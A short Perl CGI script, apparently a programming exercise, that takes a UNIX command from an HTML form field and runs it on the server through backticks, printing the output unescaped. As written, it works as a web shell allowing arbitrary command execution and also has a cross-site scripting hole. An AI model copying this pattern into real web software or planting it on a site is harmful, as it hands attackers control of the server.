#!/usr/bin/perl
use CGI qw(:standard);
print header().start_html();
$cmd = param("cmd");
print "<form> <input type='text' name='cmd' /> <input type='submit'/></form>";
if ($cmd ne "") {
	print "<b>'$cmd':</b> "."<pre>".`$cmd`."</pre>";
} 
print end_html();

# Write a Perl program to accept UNIX command from a HTML form and to display the output of the command executed.